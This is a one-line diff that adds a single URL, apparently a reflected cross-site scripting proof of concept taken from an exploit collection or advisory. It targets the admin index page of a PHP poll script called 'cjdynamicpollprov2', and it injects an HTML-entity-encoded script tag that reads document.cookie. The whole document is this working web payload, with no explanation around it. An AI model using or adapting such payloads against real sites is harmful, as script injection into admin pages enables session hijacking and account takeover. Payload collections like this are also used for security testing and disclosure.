@@ -1,0 +1,1 @@
+http://www.example.com/cjdynamicpollprov2/admin/admin_index.php/&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
